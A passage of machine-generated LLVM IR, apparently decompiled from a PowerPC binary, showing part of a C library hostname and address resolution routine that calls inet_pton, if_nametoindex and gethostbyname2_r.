  %v2_1001cbec = inttoptr i32 %v3_1001cbe8 to i32*
  store i32 %v0_1001cbec, i32* %v2_1001cbec, align 4
  %v3_1001cbf0 = load i32, i32* %stack_var_-164, align 4
  %v1_1001cbf4 = add i32 %v3_1001cbf0, 8
  store i32 %v1_1001cbf4, i32* @r5, align 4
  store i32 268553212, i32* @lr, align 4
  %v1_1001cbf8 = call i32 @inet_pton(i32 %v1_1001cbf4)
  %tmp82 = icmp slt i32 %v1_1001cbf8, 1
  br i1 %tmp82, label %dec_label_pc_1001cc2c, label %dec_label_pc_1001cc04

dec_label_pc_1001cc04:                            ; preds = %dec_label_pc_1001cbc0
  %v0_1001cc04 = load i32, i32* @r27, align 4
  %v1_1001cc04 = add i32 %v0_1001cc04, 4
  %v2_1001cc04 = inttoptr i32 %v1_1001cc04 to i32*
  %v3_1001cc04 = load i32, i32* %v2_1001cc04, align 4
  store i32 %v3_1001cc04, i32* %r0.global-to-local, align 4
  %v3_1001cc08 = icmp eq i32 %v3_1001cc04, 0
  br i1 %v3_1001cc08, label %dec_label_pc_1001cc20, label %dec_label_pc_1001cc10

dec_label_pc_1001cc10:                            ; preds = %dec_label_pc_1001cc04
  %v3_1001cc10 = icmp eq i32 %v3_1001cc04, 2
  br i1 %v3_1001cc10, label %dec_label_pc_1001cc20, label %dec_label_pc_1001cc18

dec_label_pc_1001cc18:                            ; preds = %dec_label_pc_1001cc10
  %v0_1001cc18 = load i32, i32* @r21, align 4
  %v3_1001cc18 = icmp eq i32 %v0_1001cc18, 0
  br i1 %v3_1001cc18, label %dec_label_pc_1001d3bc, label %dec_label_pc_1001cc20

dec_label_pc_1001cc20:                            ; preds = %dec_label_pc_1001cc18, %dec_label_pc_1001cc10, %dec_label_pc_1001cc04
  %v3_1001cc20 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cc20, i32* %r9.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1001cc28 = add i32 %v3_1001cc20, 4
  %v3_1001cc28 = inttoptr i32 %v2_1001cc28 to i32*
  store i32 2, i32* %v3_1001cc28, align 4
  br label %dec_label_pc_1001cc2c

dec_label_pc_1001cc2c:                            ; preds = %dec_label_pc_1001cbc0, %dec_label_pc_1001cc20
  %v3_1001cc2c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cc2c, i32* %r9.global-to-local, align 4
  %v1_1001cc30 = add i32 %v3_1001cc2c, 4
  %v2_1001cc30 = inttoptr i32 %v1_1001cc30 to i32*
  %v3_1001cc30 = load i32, i32* %v2_1001cc30, align 4
  store i32 %v3_1001cc30, i32* %r26.global-to-local, align 4
  %v3_1001cc34 = icmp eq i32 %v3_1001cc30, 0
  br i1 %v3_1001cc34, label %dec_label_pc_1001cc3c, label %dec_label_pc_1001cd44

dec_label_pc_1001cc3c:                            ; preds = %dec_label_pc_1001cc2c
  %v0_1001cc3c = load i32, i32* @r24, align 4
  store i32 %v0_1001cc3c, i32* @r3, align 4
  %v0_1001cc40 = call i32 @__GI_strlen()
  %v2_1001cc44 = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cc44, i32* %r9.global-to-local, align 4
  %v1_1001cc48 = add i32 %v0_1001cc40, 31
  store i32 %v1_1001cc48, i32* %r0.global-to-local, align 4
  %v1_1001cc4c = add i32 %v0_1001cc40, 1
  store i32 %v1_1001cc4c, i32* @r5, align 4
  %v1_1001cc50 = call i32 @__asm_rlwinm(i32 %v1_1001cc48, i32 0, i32 0, i32 27)
  %v0_1001cc54 = load i32, i32* @r24, align 4
  store i32 %v0_1001cc54, i32* @r4, align 4
  %v1_1001cc58 = sub i32 0, %v1_1001cc50
  store i32 %v1_1001cc58, i32* %r0.global-to-local, align 4
  %v0_1001cc5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cc5c = load i32, i32* @r1, align 4
  %v3_1001cc5c = sub i32 %v1_1001cc5c, %v1_1001cc50
  %v4_1001cc5c = inttoptr i32 %v3_1001cc5c to i32*
  store i32 %v0_1001cc5c, i32* %v4_1001cc5c, align 4
  %v1_1001cc60 = add i32 %v3_1001cc5c, 23
  %v1_1001cc64 = call i32 @__asm_rlwinm(i32 %v1_1001cc60, i32 0, i32 0, i32 27)
  store i32 %v1_1001cc64, i32* @r3, align 4
  store i32 268553324, i32* @lr, align 4
  %v0_1001cc68 = call i32 @memcpy()
  store i32 %v0_1001cc68, i32* @r3, align 4
  store i32 37, i32* %r4.global-to-local, align 4
  store i32 %v0_1001cc68, i32* %r30.global-to-local, align 4
  store i32 268553336, i32* @lr, align 4
  %v2_1001cc74 = call i32 @__GI_strchr(i32 37, i32 37)
  store i32 %v2_1001cc74, i32* @r28, align 4
  %v4_1001cc78 = icmp eq i32 %v2_1001cc74, 0
  %v0_1001cc7c = call i32 @__asm_mfcr()
  store i32 %v0_1001cc7c, i32* %r29.global-to-local, align 4
  br i1 %v4_1001cc78, label %dec_label_pc_1001cc88, label %dec_label_pc_1001cc84

dec_label_pc_1001cc84:                            ; preds = %dec_label_pc_1001cc3c
  %v0_1001cc84 = load i32, i32* %r26.global-to-local, align 4
  %v1_1001cc84 = trunc i32 %v0_1001cc84 to i8
  %v2_1001cc84 = load i32, i32* @r28, align 4
  %v3_1001cc84 = inttoptr i32 %v2_1001cc84 to i8*
  store i8 %v1_1001cc84, i8* %v3_1001cc84, align 1
  br label %dec_label_pc_1001cc88

dec_label_pc_1001cc88:                            ; preds = %dec_label_pc_1001cc3c, %dec_label_pc_1001cc84
  %v3_1001cc88 = load i32, i32* %stack_var_-164, align 4
  %v0_1001cc8c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001cc8c, i32* @r4, align 4
  %v1_1001cc94 = add i32 %v3_1001cc88, 8
  store i32 %v1_1001cc94, i32* @r5, align 4
  store i32 268553372, i32* @lr, align 4
  %v3_1001cc98 = call i32 @inet_pton(i32 10)
  %tmp83 = icmp slt i32 %v3_1001cc98, 1
  br i1 %tmp83, label %dec_label_pc_1001cd44, label %dec_label_pc_1001cca4

dec_label_pc_1001cca4:                            ; preds = %dec_label_pc_1001cc88
  %v0_1001cca4 = load i32, i32* @r27, align 4
  %v1_1001cca4 = add i32 %v0_1001cca4, 4
  %v2_1001cca4 = inttoptr i32 %v1_1001cca4 to i32*
  %v3_1001cca4 = load i32, i32* %v2_1001cca4, align 4
  store i32 %v3_1001cca4, i32* %r0.global-to-local, align 4
  %v3_1001cca8 = icmp eq i32 %v3_1001cca4, 0
  br i1 %v3_1001cca8, label %dec_label_pc_1001ccb8, label %dec_label_pc_1001ccb0

dec_label_pc_1001ccb0:                            ; preds = %dec_label_pc_1001cca4
  %v3_1001ccb0 = icmp eq i32 %v3_1001cca4, 10
  br i1 %v3_1001ccb0, label %dec_label_pc_1001ccb8, label %dec_label_pc_1001d3bc

dec_label_pc_1001ccb8:                            ; preds = %dec_label_pc_1001ccb0, %dec_label_pc_1001cca4
  %v3_1001ccb8 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001ccb8, i32* %r9.global-to-local, align 4
  %v1_1001ccbc = call %0 @__asm_mtcrf(i32 128, i32 %v0_1001cc7c)
  %v4_1001ccbc = extractvalue %0 %v1_1001ccbc, 2
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_1001ccc4 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001ccc4 = add i32 %v1_1001ccc4, 4
  %v3_1001ccc4 = inttoptr i32 %v2_1001ccc4 to i32*
  store i32 10, i32* %v3_1001ccc4, align 4
  br i1 %v4_1001ccbc, label %dec_label_pc_1001cd44, label %dec_label_pc_1001cccc

dec_label_pc_1001cccc:                            ; preds = %dec_label_pc_1001ccb8
  %v3_1001cccc = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cccc, i32* %r29.global-to-local, align 4
  store i32 -25165824, i32* %r9.global-to-local, align 4
  %v1_1001ccd4 = add i32 %v3_1001cccc, 8
  %v2_1001ccd4 = inttoptr i32 %v1_1001ccd4 to i32*
  %v3_1001ccd4 = load i32, i32* %v2_1001ccd4, align 4
  store i32 %v3_1001ccd4, i32* %r0.global-to-local, align 4
  %v1_1001ccd8 = call i32 @__asm_rlwinm(i32 %v3_1001ccd4, i32 0, i32 0, i32 9)
  store i32 %v1_1001ccd8, i32* %r0.global-to-local, align 4
  %v1_1001ccdc = load i32, i32* %r9.global-to-local, align 4
  %v4_1001ccdc = icmp eq i32 %v1_1001ccd8, %v1_1001ccdc
  br i1 %v4_1001ccdc, label %dec_label_pc_1001cd00, label %dec_label_pc_1001cce4

dec_label_pc_1001cce4:                            ; preds = %dec_label_pc_1001cccc
  %v0_1001cce4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1001cce4 = add i32 %v0_1001cce4, 8
  %v2_1001cce4 = inttoptr i32 %v1_1001cce4 to i8*
  %v3_1001cce4 = load i8, i8* %v2_1001cce4, align 1
  %v4_1001cce4 = zext i8 %v3_1001cce4 to i32
  store i32 %v4_1001cce4, i32* %r0.global-to-local, align 4
  %v3_1001cce8 = icmp eq i8 %v3_1001cce4, -1
  br i1 %v3_1001cce8, label %dec_label_pc_1001ccf0, label %dec_label_pc_1001cd1c

dec_label_pc_1001ccf0:                            ; preds = %dec_label_pc_1001cce4
  %v1_1001ccf0 = add i32 %v0_1001cce4, 9
  %v2_1001ccf0 = inttoptr i32 %v1_1001ccf0 to i8*
  %v3_1001ccf0 = load i8, i8* %v2_1001ccf0, align 1
  %tmp115 = urem i8 %v3_1001ccf0, 16
  %v1_1001ccf4 = zext i8 %tmp115 to i32
  store i32 %v1_1001ccf4, i32* %r0.global-to-local, align 4
  %v3_1001ccf8 = icmp eq i8 %tmp115, 2
  br i1 %v3_1001ccf8, label %dec_label_pc_1001cd00, label %dec_label_pc_1001cd1c

dec_label_pc_1001cd00:                            ; preds = %dec_label_pc_1001ccf0, %dec_label_pc_1001cccc
  %v0_1001cd00 = load i32, i32* @r28, align 4
  %v1_1001cd00 = add i32 %v0_1001cd00, 1
  store i32 268553480, i32* @lr, align 4
  %v1_1001cd04 = call i32 @__GI_if_nametoindex(i32 %v1_1001cd00)
  %v1_1001cd08 = load i32, i32* @r29, align 4
  %v2_1001cd08 = add i32 %v1_1001cd08, 24
  %v3_1001cd08 = inttoptr i32 %v2_1001cd08 to i32*
  store i32 %v1_1001cd04, i32* %v3_1001cd08, align 4
  %v3_1001cd0c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd0c, i32* %r9.global-to-local, align 4
  %v1_1001cd10 = add i32 %v3_1001cd0c, 24
  %v2_1001cd10 = inttoptr i32 %v1_1001cd10 to i32*
  %v3_1001cd10 = load i32, i32* %v2_1001cd10, align 4
  store i32 %v3_1001cd10, i32* %r0.global-to-local, align 4
  %v3_1001cd14 = icmp eq i32 %v3_1001cd10, 0
  br i1 %v3_1001cd14, label %dec_label_pc_1001cd1c, label %dec_label_pc_1001cd44

dec_label_pc_1001cd1c:                            ; preds = %dec_label_pc_1001cd00, %dec_label_pc_1001ccf0, %dec_label_pc_1001cce4
  %v3_1001cd1c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd1c, i32* @r29, align 4
  %v0_1001cd20 = load i32, i32* @r28, align 4
  %v1_1001cd20 = add i32 %v0_1001cd20, 1
  %v2_1001cd24 = ptrtoint i8** %stack_var_-156 to i32
  store i32 %v2_1001cd24, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  store i32 268553520, i32* @lr, align 4
  %v3_1001cd2c = call i32 @strtoul(i32 %v1_1001cd20, i32 %v2_1001cd24, i32 10)
  %v1_1001cd30 = load i32, i32* @r29, align 4
  %v2_1001cd30 = add i32 %v1_1001cd30, 24
  %v3_1001cd30 = inttoptr i32 %v2_1001cd30 to i32*
  store i32 %v3_1001cd2c, i32* %v3_1001cd30, align 4
  %v3_1001cd34 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cd34 = ptrtoint i8* %v3_1001cd34 to i32
  store i32 %v4_1001cd34, i32* %r9.global-to-local, align 4
  %v2_1001cd38 = load i8, i8* %v3_1001cd34, align 1
  %v3_1001cd38 = zext i8 %v2_1001cd38 to i32
  store i32 %v3_1001cd38, i32* %r0.global-to-local, align 4
  %v3_1001cd3c = icmp eq i8 %v2_1001cd38, 0
  br i1 %v3_1001cd3c, label %dec_label_pc_1001cd44, label %dec_label_pc_1001d3c4

dec_label_pc_1001cd44:                            ; preds = %dec_label_pc_1001cd1c, %dec_label_pc_1001cd00, %dec_label_pc_1001cc2c, %dec_label_pc_1001ccb8, %dec_label_pc_1001cc88
  %v3_1001cd44 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd44, i32* %r9.global-to-local, align 4
  %v1_1001cd48 = add i32 %v3_1001cd44, 4
  %v2_1001cd48 = inttoptr i32 %v1_1001cd48 to i32*
  %v3_1001cd48 = load i32, i32* %v2_1001cd48, align 4
  store i32 %v3_1001cd48, i32* %r0.global-to-local, align 4
  %v3_1001cd4c = icmp eq i32 %v3_1001cd48, 0
  br i1 %v3_1001cd4c, label %dec_label_pc_1001cd54, label %dec_label_pc_1001d050

dec_label_pc_1001cd54:                            ; preds = %dec_label_pc_1001cd44
  %v0_1001cd54 = load i32, i32* @r27, align 4
  %v1_1001cd54 = inttoptr i32 %v0_1001cd54 to i32*
  %v2_1001cd54 = load i32, i32* %v1_1001cd54, align 4
  store i32 %v2_1001cd54, i32* %r0.global-to-local, align 4
  %v1_1001cd58 = and i32 %v2_1001cd54, 4
  store i32 %v1_1001cd58, i32* %r9.global-to-local, align 4
  %v3_1001cd58 = icmp eq i32 %v1_1001cd58, 0
  br i1 %v3_1001cd58, label %dec_label_pc_1001cd60, label %dec_label_pc_1001d050

dec_label_pc_1001cd60:                            ; preds = %dec_label_pc_1001cd54
  %v1_1001cd60 = add i32 %v0_1001cd54, 4
  %v2_1001cd60 = inttoptr i32 %v1_1001cd60 to i32*
  %v3_1001cd60 = load i32, i32* %v2_1001cd60, align 4
  store i32 %v3_1001cd60, i32* %r0.global-to-local, align 4
  %v3_1001cd64 = icmp eq i32 %v3_1001cd60, 0
  br i1 %v3_1001cd64, label %dec_label_pc_1001cd6c, label %dec_label_pc_1001cd74

dec_label_pc_1001cd6c:                            ; preds = %dec_label_pc_1001cd74, %dec_label_pc_1001cd60
  store i32 512, i32* %r30.global-to-local, align 4
  %v2_1001cda4 = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001cdb0 = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001cdb4 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_1001cd88

dec_label_pc_1001cd74:                            ; preds = %dec_label_pc_1001cd60
  %v3_1001cd74 = icmp eq i32 %v3_1001cd60, 10
  %v2_1001cd78 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001cd78, i32* @r28, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br i1 %v3_1001cd74, label %dec_label_pc_1001cd6c, label %dec_label_pc_1001cebc

dec_label_pc_1001cd88:                            ; preds = %dec_label_pc_1001cdcc.dec_label_pc_1001cd88_crit_edge, %dec_label_pc_1001cd6c
  %v0_1001cd88 = phi i32 [ %v0_1001cd88.pre, %dec_label_pc_1001cdcc.dec_label_pc_1001cd88_crit_edge ], [ 512, %dec_label_pc_1001cd6c ]
  %v1_1001cd88 = mul i32 %v0_1001cd88, 2
  store i32 %v1_1001cd88, i32* %r30.global-to-local, align 4
  %v2_1001cd8c = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cd8c, i32* %r9.global-to-local, align 4
  %v1_1001cd90 = add i32 %v1_1001cd88, 30
  store i32 %v1_1001cd90, i32* %r0.global-to-local, align 4
  %v1_1001cd98 = call i32 @__asm_rlwinm(i32 %v1_1001cd90, i32 0, i32 0, i32 27)
  store i32 10, i32* @r4, align 4
  %v1_1001cda0 = sub i32 0, %v1_1001cd98
  store i32 %v1_1001cda0, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cda4, i32* @r5, align 4
  %v0_1001cda8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cda8 = load i32, i32* @r1, align 4
  %v3_1001cda8 = sub i32 %v1_1001cda8, %v1_1001cd98
  %v4_1001cda8 = inttoptr i32 %v3_1001cda8 to i32*
  store i32 %v0_1001cda8, i32* %v4_1001cda8, align 4
  %v0_1001cdac = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001cdac, i32* @r7, align 4
  store i32 %v2_1001cdb0, i32* @r8, align 4
  store i32 %v2_1001cdb4, i32* @r9, align 4
  %v1_1001cdb8 = add i32 %v3_1001cda8, 23
  %v1_1001cdbc = call i32 @__asm_rlwinm(i32 %v1_1001cdb8, i32 0, i32 0, i32 27)
  store i32 %v1_1001cdbc, i32* @r6, align 4
  store i32 268553668, i32* @lr, align 4
  %v1_1001cdc0 = call i32 @gethostbyname2_r(i32 %v1_1001cdbc)
  %v3_1001cdc4 = icmp eq i32 %v1_1001cdc0, 34
  br i1 %v3_1001cdc4, label %dec_label_pc_1001cdcc, label %dec_label_pc_1001cddc

dec_label_pc_1001cdcc:                            ; preds = %dec_label_pc_1001cd88
  %v3_1001cdcc = load i32, i32* %stack_var_-160, align 4
  store i32 %v3_1001cdcc, i32* %r0.global-to-local, align 4
  %v3_1001cdd0 = icmp eq i32 %v3_1001cdcc, -1
  br i1 %v3_1001cdd0, label %dec_label_pc_1001cdcc.dec_label_pc_1001cd88_crit_edge, label %dec_label_pc_1001cde4

dec_label_pc_1001cdcc.dec_label_pc_1001cd88_crit_edge: ; preds = %dec_label_pc_1001cdcc
  %v0_1001cd88.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001cd88

dec_label_pc_1001cddc:                            ; preds = %dec_label_pc_1001cd88
  %v3_1001cddc = icmp eq i32 %v1_1001cdc0, 0
  br i1 %v3_1001cddc, label %dec_label_pc_1001ce1c, label %dec_label_pc_1001cddc.dec_label_pc_1001cde4_crit_edge

dec_label_pc_1001cddc.dec_label_pc_1001cde4_crit_edge: ; preds = %dec_label_pc_1001cddc
  %v3_1001cde4.pre = load i32, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001cde4

dec_label_pc_1001cde4:                            ; preds = %dec_label_pc_1001cdcc, %dec_label_pc_1001cddc.dec_label_pc_1001cde4_crit_edge
  %v0_1001ce08 = phi i32 [ %v3_1001cde4.pre, %dec_label_pc_1001cddc.dec_label_pc_1001cde4_crit_edge ], [ %v3_1001cdcc, %dec_label_pc_1001cdcc ]
  store i32 %v0_1001ce08, i32* %r29.global-to-local, align 4
  %v3_1001cde8 = icmp eq i32 %v0_1001ce08, -1
  br i1 %v3_1001cde8, label %dec_label_pc_1001cf64, label %dec_label_pc_1001cdf0

dec_label_pc_1001cdf0:                            ; preds = %dec_label_pc_1001cde4
  %v3_1001cdf0 = icmp eq i32 %v0_1001ce08, 2
  %v2_1001cdf4 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001cdf4, i32* @r28, align 4
  br i1 %v3_1001cdf0, label %dec_label_pc_1001cdfc, label %dec_label_pc_1001ce08

dec_label_pc_1001cdfc:                            ; preds = %dec_label_pc_1001cdf0
  store i32 -3, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cebc

dec_label_pc_1001ce08:                            ; preds = %dec_label_pc_1001cdf0
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cebc

dec_label_pc_1001ce1c:                            ; preds = %dec_label_pc_1001cddc
  %v3_1001ce1c = load i8*, i8** %stack_var_-156, align 4
  %v4_1001ce1c = ptrtoint i8* %v3_1001ce1c to i32
  store i32 %v4_1001ce1c, i32* %r0.global-to-local, align 4
  %v2_1001ce20 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001ce20, i32* @r28, align 4
  %v3_1001ce28 = icmp eq i8* %v3_1001ce1c, null
  br i1 %v3_1001ce28, label %dec_label_pc_1001ceb8, label %dec_label_pc_1001ce30

dec_label_pc_1001ce30:                            ; preds = %dec_label_pc_1001ce1c
  store i32 %v2_1001ce20, i32* @r28, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001ce98

dec_label_pc_1001ce3c:                            ; preds = %dec_label_pc_1001ce98
  %v1_1001ce3c = inttoptr i32 %v0_1001ce3c to i32*
  %v2_1001ce3c = load i32, i32* %v1_1001ce3c, align 4
  store i32 %v2_1001ce3c, i32* %r11.global-to-local, align 4
  %v3_1001ce40 = icmp eq i32 %v2_1001ce3c, 0
  br i1 %v3_1001ce40, label %dec_label_pc_1001ce48, label %dec_label_pc_1001ce64

dec_label_pc_1001ce48:                            ; preds = %dec_label_pc_1001ce3c
  %v0_1001ce48 = load i32, i32* @r1, align 4
  %v1_1001ce48 = inttoptr i32 %v0_1001ce48 to i32*
  %v2_1001ce48 = load i32, i32* %v1_1001ce48, align 4
  %v2_1001ce4c = add i32 %v0_1001ce48, -48
  %v3_1001ce4c = inttoptr i32 %v2_1001ce4c to i32*
  store i32 %v2_1001ce48, i32* %v3_1001ce4c, align 4
  %v1_1001ce50 = add i32 %v0_1001ce48, -25
  store i32 %v1_1001ce50, i32* %r0.global-to-local, align 4
  %v1_1001ce54 = call i32 @__asm_rlwinm(i32 %v1_1001ce50, i32 0, i32 0, i32 27)
  store i32 %v1_1001ce54, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ce54, i32* %r9.global-to-local, align 4
  %v1_1001ce5c = load i32, i32* @r28, align 4
  %v2_1001ce5c = inttoptr i32 %v1_1001ce5c to i32*
  store i32 %v1_1001ce54, i32* %v2_1001ce5c, align 4
  %v0_1001ce60 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ce60 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001ce60 = add i32 %v1_1001ce60, 24
  %v3_1001ce60 = inttoptr i32 %v2_1001ce60 to i32*
  store i32 %v0_1001ce60, i32* %v3_1001ce60, align 4
  %v0_1001ce64.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001ce64

dec_label_pc_1001ce64:                            ; preds = %dec_label_pc_1001ce3c, %dec_label_pc_1001ce48
  %v0_1001ce64 = phi i32 [ %v0_1001ce3c, %dec_label_pc_1001ce3c ], [ %v0_1001ce64.pre, %dec_label_pc_1001ce48 ]
  %v1_1001ce64 = inttoptr i32 %v0_1001ce64 to i32*
  %v2_1001ce64 = load i32, i32* %v1_1001ce64, align 4
  store i32 %v2_1001ce64, i32* %r9.global-to-local, align 4
  %v2_1001ce6c = inttoptr i32 %v2_1001ce64 to i32*
  store i32 0, i32* %v2_1001ce6c, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1001ce74 = load i32, i32* @r28, align 4
  %v1_1001ce74 = inttoptr i32 %v0_1001ce74 to i32*
  %v2_1001ce74 = load i32, i32* %v1_1001ce74, align 4
  %v2_1001ce78 = add i32 %v2_1001ce74, 4
  %v3_1001ce78 = inttoptr i32 %v2_1001ce78 to i32*
  store i32 10, i32* %v3_1001ce78, align 4
  %v3_1001ce7c = load i8*, i8** %stack_var_-156, align 4
  %v4_1001ce7c = ptrtoint i8* %v3_1001ce7c to i32
  store i32 %v4_1001ce7c, i32* %r9.global-to-local, align 4
  %v0_1001ce80 = load i32, i32* @r28, align 4
  %v1_1001ce80 = inttoptr i32 %v0_1001ce80 to i32*
  %v2_1001ce80 = load i32, i32* %v1_1001ce80, align 4
  %v1_1001ce84 = add i32 %v4_1001ce7c, 16
  %v2_1001ce84 = inttoptr i32 %v1_1001ce84 to i32*
  %v3_1001ce84 = load i32, i32* %v2_1001ce84, align 4
  store i32 %v3_1001ce84, i32* %r9.global-to-local, align 4
  %v1_1001ce88 = add i32 %v2_1001ce80, 8
  store i32 %v1_1001ce88, i32* @r3, align 4
  %v1_1001ce8c = load i32, i32* @r10, align 4
  %v2_1001ce8c = add i32 %v1_1001ce8c, %v3_1001ce84
  %v3_1001ce8c = inttoptr i32 %v2_1001ce8c to i32*
  %v4_1001ce8c = load i32, i32* %v3_1001ce8c, align 4
  store i32 %v4_1001ce8c, i32* @r4, align 4
  store i32 268553876, i32* @lr, align 4
  %v0_1001ce90 = call i32 @memcpy()
  %v0_1001ce94 = load i32, i32* @r28, align 4
  %v1_1001ce94 = inttoptr i32 %v0_1001ce94 to i32*
  %v2_1001ce94 = load i32, i32* %v1_1001ce94, align 4
  store i32 %v2_1001ce94, i32* @r28, align 4
  %v3_1001ce98.pre = load i8*, i8** %stack_var_-156, align 4
  %v0_1001ce9c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001ce98

dec_label_pc_1001ce98:                            ; preds = %dec_label_pc_1001ce30, %dec_label_pc_1001ce64
  %v0_1001ce3c = phi i32 [ %v2_1001ce20, %dec_label_pc_1001ce30 ], [ %v2_1001ce94, %dec_label_pc_1001ce64 ]
  %v0_1001ce9c = phi i32 [ 0, %dec_label_pc_1001ce30 ], [ %v0_1001ce9c.pre, %dec_label_pc_1001ce64 ]
  %v3_1001ce98 = phi i8* [ %v3_1001ce1c, %dec_label_pc_1001ce30 ], [ %v3_1001ce98.pre, %dec_label_pc_1001ce64 ]
  %v4_1001ce98 = ptrtoint i8* %v3_1001ce98 to i32
  store i32 %v4_1001ce98, i32* %r9.global-to-local, align 4
  %v1_1001ce9c = mul i32 %v0_1001ce9c, 4
  store i32 %v1_1001ce9c, i32* @r10, align 4
  store i32 16, i32* @r5, align 4
  %v1_1001cea4 = add i32 %v0_1001ce9c, 1
  store i32 %v1_1001cea4, i32* %r30.global-to-local, align 4
  %v1_1001cea8 = add i32 %v4_1001ce98, 16
  %v2_1001cea8 = inttoptr i32 %v1_1001cea8 to i32*
  %v3_1001cea8 = load i32, i32* %v2_1001cea8, align 4
  store i32 %v3_1001cea8, i32* %r9.global-to-local, align 4
  %v2_1001ceac = add i32 %v3_1001cea8, %v1_1001ce9c
  %v3_1001ceac = inttoptr i32 %v2_1001ceac to i32*
  %v4_1001ceac = load i32, i32* %v3_1001ceac, align 4
  store i32 %v4_1001ceac, i32* %r0.global-to-local, align 4
  %v3_1001ceb0 = icmp eq i32 %v4_1001ceac, 0
  br i1 %v3_1001ceb0, label %dec_label_pc_1001ceb8, label %dec_label_pc_1001ce3c

dec_label_pc_1001ceb8:                            ; preds = %dec_label_pc_1001ce98, %dec_label_pc_1001ce1c
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cebc

dec_label_pc_1001cebc:                            ; preds = %dec_label_pc_1001cd74, %dec_label_pc_1001ce08, %dec_label_pc_1001cdfc, %dec_label_pc_1001ceb8
  %v0_1001d024 = phi i32 [ 0, %dec_label_pc_1001cd74 ], [ 0, %dec_label_pc_1001ce08 ], [ -3, %dec_label_pc_1001cdfc ], [ 0, %dec_label_pc_1001ceb8 ]
  %v0_1001cebc = load i32, i32* @r27, align 4
  %v1_1001cebc = add i32 %v0_1001cebc, 4
  %v2_1001cebc = inttoptr i32 %v1_1001cebc to i32*
  %v3_1001cebc = load i32, i32* %v2_1001cebc, align 4
  store i32 %v3_1001cebc, i32* %r0.global-to-local, align 4
  %v3_1001cec0 = icmp eq i32 %v3_1001cebc, 2
  br i1 %v3_1001cec0, label %dec_label_pc_1001cee4, label %dec_label_pc_1001cec8

dec_label_pc_1001cec8:                            ; preds = %dec_label_pc_1001cebc
  %v0_1001cec8 = load i32, i32* @r21, align 4
  %v3_1001cec8 = icmp eq i32 %v0_1001cec8, 0
  br i1 %v3_1001cec8, label %dec_label_pc_1001ced0, label %dec_label_pc_1001cedc

dec_label_pc_1001ced0:                            ; preds = %dec_label_pc_1001cec8
  %v3_1001ced0 = icmp eq i32 %v3_1001cebc, 0
  br i1 %v3_1001ced0, label %dec_label_pc_1001cee4, label %dec_label_pc_1001d028

dec_label_pc_1001cedc:                            ; preds = %dec_label_pc_1001cec8
  %v3_1001cedc = icmp eq i32 %v0_1001d024, 0
  br i1 %v3_1001cedc, label %dec_label_pc_1001ceec, label %dec_label_pc_1001cee4

dec_label_pc_1001cee4:                            ; preds = %dec_label_pc_1001ceec, %dec_label_pc_1001cedc, %dec_label_pc_1001ced0, %dec_label_pc_1001cebc
  store i32 512, i32* %r29.global-to-local, align 4
  %v2_1001cf18 = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001cf24 = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001cf28 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_1001cefc

dec_label_pc_1001ceec:                            ; preds = %dec_label_pc_1001cedc
  %v1_1001ceec = inttoptr i32 %v0_1001cebc to i32*
  %v2_1001ceec = load i32, i32* %v1_1001ceec, align 4
  store i32 %v2_1001ceec, i32* %r0.global-to-local, align 4
  %v1_1001cef0 = and i32 %v2_1001ceec, 16
  store i32 %v1_1001cef0, i32* %r9.global-to-local, align 4
  %v3_1001cef0 = icmp eq i32 %v1_1001cef0, 0
  br i1 %v3_1001cef0, label %dec_label_pc_1001d028.thread, label %dec_label_pc_1001cee4

dec_label_pc_1001cefc:                            ; preds = %dec_label_pc_1001cf40.dec_label_pc_1001cefc_crit_edge, %dec_label_pc_1001cee4
  %v0_1001cefc = phi i32 [ %v0_1001cefc.pre, %dec_label_pc_1001cf40.dec_label_pc_1001cefc_crit_edge ], [ 512, %dec_label_pc_1001cee4 ]
  %v1_1001cefc = mul i32 %v0_1001cefc, 2
  store i32 %v1_1001cefc, i32* @r29, align 4
  %v2_1001cf00 = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cf00, i32* %r9.global-to-local, align 4
  %v1_1001cf04 = add i32 %v1_1001cefc, 30
  store i32 %v1_1001cf04, i32* %r0.global-to-local, align 4
